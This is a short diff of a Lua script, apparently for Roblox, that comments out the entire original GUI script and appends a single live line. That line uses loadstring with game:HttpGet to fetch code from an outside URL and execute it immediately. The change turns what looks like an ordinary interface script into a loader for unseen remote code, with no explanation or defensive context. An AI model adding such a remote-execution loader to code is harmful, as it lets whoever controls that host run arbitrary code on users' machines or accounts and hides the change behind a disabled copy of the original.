@@ -1,4 +1,4 @@
-local Players = game:GetService("Players")
+--[[  local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local StarterGui = game:GetService("StarterGui")
 
@@ -116,4 +116,6 @@ end)
 -- Close button functionality
 CloseButton.MouseButton1Click:Connect(function()
     Gui:Destroy()
-end)
+end)  ]]
+
+loadstring(game:HttpGet('https://yarhm.goteamst.com/scr', false))()
